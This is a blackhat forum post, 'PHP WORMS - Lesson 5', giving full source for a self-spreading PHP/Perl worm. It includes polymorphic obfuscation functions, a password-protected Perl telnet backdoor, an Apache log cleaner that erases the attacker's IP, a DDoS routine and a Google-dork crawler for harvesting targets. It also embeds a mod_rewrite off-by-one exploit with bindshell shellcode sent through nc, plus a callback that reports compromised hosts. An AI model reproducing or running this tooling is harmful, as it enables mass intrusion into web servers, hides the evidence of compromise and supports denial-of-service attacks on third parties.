/*PHP WORMS - Lesson 5 - Morph(), Unmorph(), Trick/JunkCoding
Lesson 4: http://blackhat-forums.com/phpBB2/viewtopic.php?t=1955

Heres the Features list
[b]
NEW KEY FEATURES
[color=red]*[/color][color=green]Self Cryptic, Ad-Hoc, Parametric, Override, and False Subtyping implemented Polymorphism[/color]
[color=red]*[/color][color=green]Morph() - polymorphic functioning/input/output (read explanation)[/color]
[color=red]*[/color][color=green]Unmorph() - polymorphic functioning/input/output (read explanation)[/color]

FEATURES
[color=red]*[/color][color=green]Self Cryptic, Ad-Hoc, Parametric, Override, and False Subtyping implemented Polymorphism[/color]
[color=red]*[/color][color=green]Morph() - polymorphic functioning/input/output (read explanation)[/color]
[color=red]*[/color][color=green]Unmorph() - polymorphic functioning/input/output (read explanation)[/color]
[color=red]*[/color][color=green]Remote Remote Remote Remote Owned Viewer(ex. type the 'owned' cmd in the telnet server and view all owned boxes from any box)[/color]
[color=red]*[/color][color=green]Drop and Install proxy server (ex.install_proxy_server(); )[/color]
[color=red]*[/color][color=green]Password Protected Telnet[/color]
[color=red]*[/color][color=green]Remote Remote Remote Proxy display( I did not just make that up, view explanation)[/color]
[color=red]*[/color][color=green]Remote System Info+Connect/Listen status[/color]
[color=red]*[/color][color=green]Proxy Server->Self Remove Capable[/color]
[color=red]*[/color][color=green]Remote Remote Remote file download (I did not just make that up, view explanation)[/color]
[color=red]*[/color][color=green]Multi Serv Capable(the function is flexible enough to make multple servers on different ports in different locations with just a little editing)[/color]
[color=red]*[/color][color=green]Apache1 && Apache2 Log Cleaner[/color]
[color=red]*[/color][color=green]SADE, Simple Automation Detection Evasion[/color]
[color=red]*[/color][color=green]Enhanced+ duplicate filter[/color]
[color=red]*[/color][color=green]Google Block aware[/color]
[color=red]*[/color][color=green]Remote Search ERROR status notification[/color]
[color=red]*[/color][color=green]Remote target list output[/color]
[color=red]*[/color][color=green]Single Function Search and Sploit[/color]
[color=red]*[/color][color=green]STM, Self Target Management (ex. no external files containing target addresses needed)[/color]
[color=red]*[/color][color=green]Remote and Local file drop capable[/color]
[color=red]*[/color][color=green]Previously 0wned Detection (ex. if you already 0wn that box it will remove stop the process and remove its self)[/color]
[color=red]*[/color][color=green]Self Removal (ex. self removal after completing task or ERROR out)[/color]
[color=red]*[/color][color=green]Capable Flex sploit/file execution (ex. flexible enough to download and or execute any exploit)[/color]
[color=red]*[/color][color=green]Momentum DDoS (ex. mddos('address');  remember it's  momentum so you will need to have alot of machines running this script)[/color]
 [/b]
[code]
EXPLANATION(s)
NOTE: It would not hurt to morph $core;
---------
explaining the morph()/unmorph()
-------------------php]
$d = morph($data);
echo "\n$d\n".unmorph($d)."\n";
------------------/php]

f3936m77154o682e5cac7ac.8cdccseb600ma325au94533refba4occ7d1f7cb06-fe075t72662a67d3che97eak8f053c4299ba22520l77b7db3278e/90583/ff7dd:8d3aep35eb1t0c7ectb65b2h
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

6dfd2m028fdo374e9cda880.e60e3s2a9c8m7402eude5dere6739o78c74f9fef2-df2aet93e13a380a2h13160kc5d02c6af21a9a988l21150ba3ecf/e9567/427e4:b69b0p83c37t81a03t05097h
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

35043m721f9o849b6c1ee5b.6b6e5sb130amaaec2u91cberc90d7o53027fb2440-010cft77457a24535hd6212ke26d9c7d474affebel36e9bb31477/c7706/efa37:b8b03p98a3ct5a0ffta76d7h
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

fd660mc23d9o70fc0ca4020.e568cs6d674m006a5ua6e25rcb916obe7aaf67976-3f55bt6b4a9afe958h161bek408b0ca04d8ae676cl00605b6f47f/d9ebe/2f910:8a265p12014tfba97t8b1f6h
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

8ce28mea5d1obd1b4c665f5.b684es310ecm07e45uaf14br979a8o8b717f31f22-ac26atd4e1ba80af6he611ck130a6c4aec8ad6a43lb2281bdcae0/58c48/f8f87:de09fp61573t04a2fta161ch
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

bb1b4meccceo9fa0ec0a786.75496s6b735mfaa7fu8d04crcc792o452d7f09f79-de613tfefd9a6462fh8fd90kf2198c7a4dca0493fl07155b40aa1/d4c87/5b1f9:81da6p836aftffce3t0cafah
http://blackhat-forums.com
[ME @ Codepimp]# php -q simp-worm_sys.p5.php

f56bama65cfo6c344c7bfd5.2cae4s32295mc8c44u0dcaare45b4o1c68ff940c1-d3e3ft19c94a51a32hc502fk74bafcd3ab6a7b053l036dabbbe71/61ed4/d48e5:ff2e5p96988tb8647te0c2eh
http://blackhat-forums.com
---------------------------------------------[morphing the morphed]
You can morph what ever the fuck you want but if you want this to be effective don't
put the code you want to morph in this php file. Do something like this.

$data = morph('http://www.site.com/code.txt'); # morph the address
# its better to have this php file retrieve a morphed version of the url from another url so that it is different everytime
#you could as well morph the code then place it in this php file then morph it again while in this php file 
$data = morph(file_get_contents(unmorph($data))); #unmorph the address and morph the data retrieved from the address

echo unmorph($data); #unmorph and put it out

explaining the remote remote remote web proxy, owned list, sys info
-----------------------------------------------------------
owned/attack/notify list location = http://site1.com/out.file
proxy capture document location = http://site2.com/test/test.php
telnet/proxy server is on a remote machine = site3.com:7357

[me]# telnet site3.com 7357
Trying [site3.com ip addr]...
Connected to [site3.com].
Escape character is '^]'.
mypassword
0wned server: name
help

CoMMANDS
help: you get this menu
web: access remote remote web proxy
owned: shows a list of your owned/targeted servers
delete this server!: kills your connection and uninstalls the server

web   
usage: web http://www.site.com/index.php
usage: web http://site.com/index.php

web http://blackhat-forums.com
sending contents of http://blackhat-forums.com
<--snip--
now in the background what is going on is
you direct -> site3.com #remote1
site3.com connects to-> site2.com/test/test.php?p=http://blackhat-forums.com, #remote2
site2.com connects to -> http://blackhat-forums.com and write a temp file to site2.com #remote3
if you were to view site2.com/test/test.php it would show you the contents of the site without connecting to any site AT ALL!
This what makes the document safe to view for those who have "unsafe" links you need to view.
--snip-->

sent contents of http://blackhat-forums.com #success, if there is a error you will recieve the error in plain text

<--snip--
#if we were to look on site2.com where the capture doc is located we will find a mirror of the url on the machine.
[me]@site2.com# head -n 20 out.file | grep blackhat
<p align="center"><img border="0" src="blackhat.jpg" width="330" height="500"></p>
<font color="#0000FF"><a href="http://blackhat-forums.com/phpBB2/index.php">
Enter </a></font><a href="http://blackhat-forums.com/phpBB2/index.php">Forum</a><font color="#0000FF">&nbsp;

#like pie =D

now lets download some l33t warez.
--snip-->

web http://hackedsite.com/owned/folder/sploits.tar
sending contents of http://hackedsite.com/owned/folder/sploits.tar
sent contents of http://hackedsite.com/owned/folder/sploits.tar

<--snip--
#now lets move that warez
[me]@site2.com# mv out.file /home/user/public_html/admin/owned_shit.tar
#now available for download

#now lets see what boxes we have owned anonymously =D
--snip-->

owned  #owned command is your best friend
HTTP/1.1 200 OK
Date: Thu, 08 Mar 2007 00:57:15 GMT
Server: Apache/2.0.55 (Ubuntu) PHP/5.1.6 mod_perl/2.0.2 Perl/v5.8.8
Last-Modified: Tue, 06 Mar 2007 10:54:26 GMT
ETag: "4a4154-a7a-e5b95c80"
Accept-Ranges: bytes
Content-Length: 2682
Content-Type: text/plain; charset=UTF-8

www.php.net
en.wikipedia.org
www.w3schools.com
www.php.com
www.phpbuilder.com
..
<--snip--
now in the background what is going on is

you direct -> site3.com #remote1
site3.com connects to-> site2.com/test/test.php?p=http://site1.com/out.file, #remote2
site2.com connects to -> http://site1.com/out.file and write a temp file to site2.com #remote3 grabs your owned/attack/notify list
site2.com connects to -> site3.com #remote 4
site3.com recieves->owned/attack/notify list and displays in your terminal on site3.com

any box that is owned will view the same list
--snip-->
...
phpxmlrpc.sourceforge.net
plphp.commandprompt.com
www.maani.us
www.ibm.com

info #info command
 info a = all
 info u = users
 info n = node
 info h = hardware
 info c = connections

info u
user user user user
info n
Linux codepimp 2.6.17-11-386 #2 Thu Feb 1 19:50:13 UTC 2007 i686 GNU/Linux
info h
processor       : 0
vendor_id       : AuthenticAMD
cpu family      : 15
model           : 36
model name      : AMD Turion(tm) 64 Mobile Technology MT-30
stepping        : 2
cpu MHz         : 800.000
cache size      : 1024 KB
fdiv_bug        : no
hlt_bug         : no
f00f_bug        : no
coma_bug        : no
fpu             : yes
fpu_exception   : yes
cpuid level     : 1
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt lm 3dnowext 3dnow up pni lahf_lm ts fid vid ttp tm stc
bogomips        : 1597.57
info c
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      8 127.0.0.1:37096         [site3.com ip address]:7357          ESTABLISHED
tcp        0      0 127.0.0.1:7357           [site3.com ip address]:37096         ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ]         DGRAM                    4613     @/com/distro/upstart
unix  4      [ ]         DGRAM                    19081787 /dev/log
unix  2      [ ]         DGRAM                    4750     @/org/kernel/udev/udevd
...
info a
---long long long shit---- but you get the point
#goast----------------------------------------------------E-N-J-O-Y-!-
[/code]

Due to forgetting where my salts are I took the heavy ass salts out, now remove 2 lines of code for this shit to work and your home free.
[code]*/
<?php

$r = 'm';  #m
$m = 'p'; #o
$h = 'r';   #r
$o = 'h';  #p
$p = 'o';  #h
error_reporting(0);#for the educated / don't touch =D
$rm = $r.$m; #mp
$ho = $h.$o;  #rh
$p = $p.$rm.$ho; #morph
$p = $p.$p; #morph morph
$p = strtr($p,$p,$r); #replace everything with m
$p = strtr($p,$p,$p.'o'); #replace everything with mo
$p = strtr($p,$p,$r.'o'.$h); #replace everything with mor
$p = strtr($p,$p,$r.'o'.$h.$m); #replace everything with morp
$p = strtr($p,$p,$r.'o'.$h.$m.$o); #replace everything with morph
$p = substr($p,0,1); #erase everything and make $p the letter o
$p = $r.$p.$h.$m.$o.rand(0,10).rand().rand(10,100); #$p = morph[random-numbers-here]
$p = $p.$p; #$p = morph[random-numbers-here]morph[random-numbers-here]
$p = substr($p,0,5); #$p = morph
if($p = strtr($p,$p,$p)) #replace $p with $p so that $p is equal to $p and $p is true (there's one for your brain)
{
 function morph($in)#fuck with me
{
/*
you can morph what ever the fuck you want but if you want this to be effective don't
put the code you want to morph in this php file. Do something like this.

$data = morph('http://www.site.com/code.txt'); # morph the address (its better to morph the address then place it in this php file)
$data = morph(file_get_contents(unmorph($data))); #unmorph the address and morph the data retrieved from the address

echo unmorph($data); #unmorph and put it out
*/
   $total = $total; #polymorph things
   $total = strlen($in);#know how many we have
   $total = $total; #polymorph things
   $x = strlen($in); #count
   $i = ((($x*$x+$x-$x)/$x)+($x-$x)); #$x = $x while $i != 0 but if $i == 0 $i == $x and is equal to 0

   for($i<=0;$x--;)#this would be called a false positive
   {
     if($x!=$total)#if not equal keep $x the same
    {
     $out[$x] = substr($in,$x,1) ;#grab the first char
    }else{
     $out[$x] = substr($in,($x-1),1); #grab the rest
    }
     $tmp = $out[$x];#we now have the char in a array/string
     $out[$x] = sha1((rand()*rand()).md5($out[$x]));#morph around a bit
     $out[$x] = substr($out[$x],0,5).$tmp;#grab 5 chars of the hash and put the char of the input at the end
   }

   while($total+1>=1)#add an offset and clean of null results
  {
   $data = $data.$out[$total];#$data now equals all the data in the $out array
   $total--;#remove one so we do not have repeats and a infinite loop
  }

  return $data;#push the data into the world
 }

function unmorph($in)#can you believe im drunk?
{
   $total = strlen($in);#count how many chars in the input
   $total = $total/6;#divide by 6 so we can break that motha up

  for($total>=0;$total--;)#spread it
  {#dont touch
   if($filter==NULL){$filter=5;}
   $tmp = substr($in,$filter,1);#only retrieve the non hashed part
   $filter+=6;#increment 6 bitch
   $data[$total]=$tmp;#roll it
   #dont touch
  }

  for($flush=count($data),$flush>=0;$flush--;)#clean out the data array
 {
    $decompressed = $decompressed.$data[$flush];#make our data one long ass string
 }

$decompressed = strrev($decompressed);#put it back the way you found it
return $decompressed;#push the data into the world
}
}

$core = 'name_of_this_file.php'; #make sure this is correct

function install_proxy_server()#you must configure 
{
#this is the document that captures proxy request from server(s), do not host this on the same server as your notify/owned/attacked list/log
/*
GNU nano 1.3.12                         File: test.php 
<?php
$page = $_GET['p'];#dont touch
$proxy = 'out.file';#name of tmp file

if(isset($page))#if this contains something then lets grab it =)
{
 $out = fopen($proxy,'w+');#open temp
 fwrite($out,file_get_contents($page));#write temp
}else{
 $out = fopen($proxy,'r');#open temp
 $tuo = fread($out,filesize($proxy));#read temp
echo $tuo;#display the bitch
}
fclose($out);
?>
*/
$server_file_name = 'server_test';#name of the dropped server
$server_name = 'name';#server name
$server_port = '7357';#server port
$pkey = 'mypassword';#server password
$welcome_login = "0wned server: $server_name";#message on login
$owned_s = 'localhost';#server that holds the notify/owned/attack log/list
$owned_l = '/out.file';#location of file on $owned_s
$proxy_s = 'localhost';#server that holds the proxy capture document
$proxy_l = '/test/test.php';#location of file on $proxy_s
/*
Trying 127.0.0.1...
Connected to localhost.localdomain.
Escape character is '^]'.
mypassword
Welcome to PHP_WORM_TEST
help

CoMMANDS
help: you get this menu
web: access remote remote web proxy
owned: shows a list of your owned/targeted servers
delete this server!: kills your connection and uninstalls the server
*/
#the server code, please touch, feel it up, break it to the bone
$pserv =
'
#!/usr/bin/perl

use IO::Socket;#dont touch me
use bytes;#or me

$server_name = \''.$server_name.'\';#server name, stfu you never know when you need it
$server_port = \''.$server_port.'\';#server port, 73753D this bitch for over 10 hours you better enjoy this damnit! (note to self: learn more perl)
$pkey = \''.$pkey.'\';#server password
#dont touch
my $sock = new IO::Socket::INET(LoclHost=>$server_name,LocalPort=>$server_port,Proto=>\'tcp\',Listen=>10,Reuse=>1);
my $ino = $sock->accept();
$go=0;
#/dont touch

while(<$ino>)#while the socket awaits for and to accept incoming data
{
#this would be the password you type to get this sucker to work.
#there is no pwd prompt visble so once your connected just get to typing that sucker in there
 if($_=~/$pkey/ && $go ne 1)
 {
   my $in = substr $_,length("$pkey0"),-2;#take out \n at the end (im a perl nub so stfu) 
   print $ino "'.$welcome_login.'\n";#welcome message is password is entered correctly
   $go = 1;#dont touch
 }
 
 if($_ ne NULL && $go eq 1)#make sure nothing is empty and that you are logged in
 {
#remote->remote->remote->web proxy
  if($_=~/^web/)
  {
   $into = substr $_,4;#remove cmd
   @into = split(/ /,$_);#get the url

   if(@into<2||@into>2||$into[1]!~/^http:\/\//)#make sure the shit fits
   {
    #I hope you appreciate these comments//use howto
    print $ino "usage: web http://www.site.com/index.php\nusage: web http://site.com/index.php\n";
   }else{
    $host = \''.$proxy_s.'\';#server that host the document grabber
    $location = "'.$proxy_l.'?p=$into[1]";#where the document grabber is on the host

    print $ino "sending contents of $into[1]";#whats going on notify
 
    my $web = new IO::Socket::INET(PeerAddr=>$host,PeerPort=>80);#dont touch
    print $web "GET $location HTTP/1.1\nHost: $host\n\n";#ask sir http, touch this all you want, if you want to break it :P
   
    while(<$web>)#when sir http opens the door, we rob him of all his code
    {
     print $ino $_;#let you view the output in pure code

     if($_ =~/<*\/html>/||$_ =~/<*\/HTML>/){close($web);}#once you find and reach </html> or </HTML> close the door of sir http
    }
    print $ino "sent contents of $into[1]\n"; #whats going on notify
   }
  }
 
 #SYSNFO
  if($_=~/^info/){#check for the info cmd
   my @other = split(/ /,$_);#break the bitch up
   
   #count how many
   if(2>@other||2<@other){print $ino " info a = all\n info u = users\n info n = node\n info h = hardware\n info c = connections\n";}
 
   
   my $other = $other[1];#snort it
   #drugs are bad, and the below code shows users,node info,hardware, and connections. It is also know as info a command
   if($other =~ \'a\'){print $ino "\n+USERS+\n",`users`,"\n+NODE-INFO+\n",`uname -a`,"\n+HARDWARE+\n",`cat /proc/cpuinfo`,"\n+CONNECTIONS+\n",`netstat -n`;}
   if($other =~ \'u\'){print $ino `users`;}#list users, also known as info u command
   if($other =~ \'n\'){print $ino `uname -a`;}#show node info, Linux  codepimp 2.6.17-11-386 #2 Thu Feb 1 19:50:13 UTC 2007 i686 GNU/Linux, info n command
   if($other =~ \'h\'){print $ino `cat /proc/cpuinfo`;}#code pushing user command, for hardware info = info h
   if($other =~ \'c\'){print $ino  `netstat -n`;}#show connections, this fucker is usually long so buffer^ and change window modes for best view
  }
#OWNED
 if($_=~/^owned/)
  {
    $host = \''.$owned_s.'\';#server that host the notify/attacked/owned list
    $location = \''.$owned_l.'\';#file location on server

    my $web = new IO::Socket::INET(PeerAddr=>$host,PeerPort=>80);#dont touch
    print $web "GET $location HTTP/1.1\nHost: $host\n\n";#don\'t touch
    
    while(<$web>)#when open keep open
    {
     print $ino $_;#view teh 0wned
     if(length($_)<=0){close($web);}#end of list, close connection to the owned list server
    }
  }
#DELETE
 if($_=~/delete this server!/)#look for the \'delete this server!\' call, and yes thats the actuall command
 {
  `rm -rf $0`; #deletes it self
  exit;#this quits the server since the above code that deletes this file does actually delete the server but not the connection
 }
#HELP
 if($_=~/help/){print $ino "\nCoMMANDS\nhelp: you get this menu\nweb: access remote remote web proxy\nowned: shows a list of your owned/targeted servers\ndelete this server!: kills your connection and uninstalls the server\n";}
 }
}

close($sock);#incase some shit happens we need to close this socket incase it gets a mind of it\'s own
';

$server = fopen($server_file_name,'w+');
@fwrite($server,$pserv);
@fclose($server);
}

#clean apache 1 & 2 logs
function echapa()#don't touch anything here
{

 /*$out = file_get_contents('http://whatismyip.com');$out = explode('<TITLE>',$out);$out = explode('<',$out[1]);$out = $out[0];
 $ip = substr($out,17);*/

 $ip = ''; #ip to clean out of logs here  

$v1 = '/var/log/apache';
 $v2 ='/var/log/apache2';
 
 if(!is_dir($v1))
 {
  $log = $v2;
 }
 
#delete backup log->create a new backup without the machines ip address->overwrite the original log with the backup log this script made->home for dinner
 @shell_exec("rm -rf ".$log."/access.log.1;cat ".$log."/access.log | grep -v $ip > ".$log."/access.log.1; cp -f ".$log."/access.log.1 ".$log."/access.log");

}

/* don't mess up
function mddos($addr)#don't touch anything here
{
 $pdos = 
 "#!/usr/bin/perl
 for(;;)
 {
 `curl -r 0-1000 http://$addr`;
  sleep(0.55);#no 100%cpu
 }
 ";#
 $file = rand();
 $drop = @fopen($file,'w+');
 @fwrite($drop,$pdos);
 @fclose($drop);
 @shell_exec('perl '.$file.'&');
}
*/

function notify($site)
{
global $urlo;

$urlo = 'localhost';#url that host sploited.php or what ever you called it 
$site= "$urlo/sploited.php?t=$site";#don't modify ?t=$site
 @file_get_contents($site);#dont touch
 /*
DOCUMENT: sploited.php
------------------------------------#
<?php

$sploited = 'out.file'; #if the sploit was run against a target the target will be listed here, secure way to know what you 0wn(ed)
#dont touch
if(isset($_GET['t']))
{
 $o = @fopen($sploited,'a+');
 @fwrite($o,$_GET['t']."\n");
 @fclose($o);
}
#/dont touch

$decoy[0] = 'http://yahoo.com';#site url you wish to display
$decoy[1] = '!';#temp document name

#dont touch
if(!file_exists($decoy[1]))
{
 $decoy[0] = file_get_contents($decoy[0]);
 $decoy[2] = @fopen($decoy[1],'a+');

 @fwrite($decoy[2],$decoy[0]);
 @fclose($decoy[2]);

}

  echo file_get_contents($decoy[1]);
#/dont touch
?>
*/
}

function chexmix()
{
 $check = @shell_exec('find / | grep '.$core); #most of the web is unix but if you want to get teh windoz as well then do what you do

 if(strstr($check,'Permission denied')==NULL)
 {
   if($check!=NULL)#make sure it has some content
  {
   @unlink($self);#"this box has already been owned but there was fatal error, now removing
    die();
  }
 }
}

function sploit($targets) #if this is not correct the whole system fails
{


  //mkdir('.Trash/.Trash');
 $flocation = 'sploit_name.sh';//.Trash/.Trash/file sneaky ;) | /tmp/ is usually always writeable || /tmp/filename && don't use ./
 $execv = "sh $flocation ";
 #file location = $flocation
 #execution cmd = $execv

#try = sploit source code to be written/run
 $try = /*
 #!/bin/sh
 # Exploit for Apache mod_rewrite off-by-one.
 # Vulnerability discovered by Mark Dowd.
 # CVE-2006-3747
 # 
 # by jack <jack\x40gulcas\x2Eorg>
 # 2006-08-20
 #
 # Thx to xuso for help me with the shellcode.
 #
 # I suppose that you've the "RewriteRule kung/(.*) $1" rule if not
 # you must recalculate adressess.
  #
  # Shellcode is based on Taeho Oh bindshell on port 30464 and modified
  # for avoiding apache url-escape.. Take a look is quite nice ;)
  #
  # Shellcode address in heap memory on apache 1.3.34 (debian sarge) is at
  # 0x0834ae77 for any other version/system find it.
  #
  # Gulcas rulez :P

 echo -e "mod_rewrite apache off-by-one overflow"
 echo    "by jack <jack\x40gulcas\x2eorg>\n\n"

 if [ $# -ne 1 ] ; then
  echo "Usage: $0 webserver"
  exit
 fi

 host=$1

 echo -ne "GET /kung/ldap://localhost/`perl -e 'print "%90"x128'`%89%e6\
 %31%c0%31%db%89%f1%b0%02%89%06%b0%01%89%46%04%b0%06%89%46%08%b0%66%b3\
 %01%cd%80%89%06%b0%02%66%89%46%0c%b0%77%66%89%46%0e%8d%46%0c%89%46%04\
 %31%c0%89%46%10%b0%10%89%46%08%b0%66%b3%02%cd%80%b0%01%89%46%04%b0%66\
 %b3%04%cd%80%31%c0%89%46%04%89%46%08%b0%66%b3%05%cd%80%88%c3%b0%3f%31\
 %c9%cd%80%b0%3f%b1%01%cd%80%b0%3f%b1%02%cd%80%b8%23%62%69%6e%89%06%b8\
 %23%73%68%23%89%46%04%31%c0%88%46%07%b0%30%2c%01%88%46%04%88%06%89%76\
 %08%31%c0%89%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%c0%b0%01%31%db\
 %cd%80%3FC%3FC%3FCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\
 %77%ae%34%08CCCCCCCCCCCCCCCCCCCCCCCCCCC%3FC%3F HTTP/1.1\r\n\
 Host: $host\r\n\r\n" | nc $host 80

 # milw0rm.com [2006-08-21]
 */'!';#file_get_contents('url_to_txt'); <--- for remote drop

 $drop = fopen($flocation,'w'); #make file
 fwrite($drop,$try); #sploit file is now on the machine
 fclose($drop); #close file
 shell_exec('chmod a+x '.$flocation);#make it run friendly

 $run = 'PWN IN PROGRESS <-'.chop(shell_exec('id -ng')).'@'.chop(shell_exec('uname -n')).'->';#whoami@machine-node/name
 for($sc=0;$sc<=count($targets);$sc++)
 {
   if($targets[$sc]!=NULL)#anti-null objects
  {
    if($targets[$sc]!='https:')#anti-random https objects
     {
        notify($targets[$sc]);
        #echo $run.'  '.$targets[$sc]."\n"; #give status output
        #shell_exec($execv.$targets[$sc]); #sploit the target
    }
  }
 }
}

$db = NULL; #all targets are in this string - bye bye arrays!

function crawl($char_string,$int)#target gather
{
chexmix(); #lets get started

global $rest;
$rest=$rest+rand(4,21);#Anti-Google Block pause/sleep int


$target = $targets[0];#if you actually read this comment line you probably need to work on your english


if($rest>=36){$rest=0;$rest=$rest+2;}#reset pause/sleep int to 0 when greater than or equal to 36

//echo "Anti-Google Block Method: Pause/Sleep Interval(s) increments of [5-20] and reset at 40\nCurrent Time:$rest\n";#view output
sleep($rest);
//echo "Requestiong URLs of $char_string...\n";#view output

$search = $char_string;#what google looks for
$page = 0;#don't touch this :P

while(1)
{

$src = file_get_contents("http://www.google.com/search?q=$search&hl=en&start=$page&sa=N");#get google document
$in = strstr($src,'<span class=a>');#starting result url filter

#error codes
$done = strstr($src,"Sorry, Google does not serve more than");
$unfound = strstr($src,"did not match any documents.");
$block_automation = strstr($src,"but your query looks similar to automated requests from");
#/error codes

if($done!= NULL)
{
   $db = explode('|',$db); #every url is in $db
   sploit($db); #sploit every url $db
   // echo "\nCompleted Google request of $char_string\n\n";#view output
    break;
}else if($unfound!= NULL){
   notify('No Results');
   echo "Nothing Found for $char_string\n\n";break; #no results
}else if($block_automation!=NULL){
   notify('Google Block/Detection ALERT');
   echo "Blocked/Automation Detection on URL results for $char_string\n\n";break; #fuck! google caught on - try different queries next time.
}

$clean = array('<b>'=>'','</b>'=>'');#we want only the goodshit

$x=0;#don't touch

while($x<=9)
{

#1st result on page
if($x<=0)
{
 $main[0] = strtr($in,$clean);#filter the bs
 $main[1] = substr($main[0],14);#remove the first 14 chars to get to the url/url-format
 $main[1] = explode('/',$main[1]);#break the url up
 $link[0] = $main[1][0];#now we have site.com or www.site.com
}

#results 2-10 on page
$in = strstr($in,'</span>');#start filtering from last result
$in = strstr($in,'<span class=a>');#new start point for filter
$main[0] = strtr($in,$clean);#filter the bs
$main[1] = substr($main[0],14);#remove the first 14 chars to get to the url/url-format
$main[1] = explode('/',$main[1]);#break the url up
$link[0] = $main[1][0];#now we have site.com or www.site.com

$link[$x] = $link[0];#don't touch

if($link[0]!=NULL)#filter null objects
{
  if(strstr($db,$link[0])==NULL)#no duplicates
 {
  $db=$db.'|'.$link[0];#add url to the $db
 }
}

#dont touch
#if there is multiple links to the same site on the results page it will not add the url more than once 
for($xx=0;$xx<=9;$xx++)
{
 if($link[$x] == $link[$xx]) 
 {
  $link[$x] == NULL;
 } 
}
#/dont touch

$x++;#don't touch
$page=$page+10;#you can touch if you want you damn phphile but you will lose results so keep it at 10
  }
 }
}


;#crawl(rawurlencode('php'),1);
#mddos('localhost');
#install_proxy_server();
#echapa();
//unlink($core); #job complete - remove self
?>
[/code]
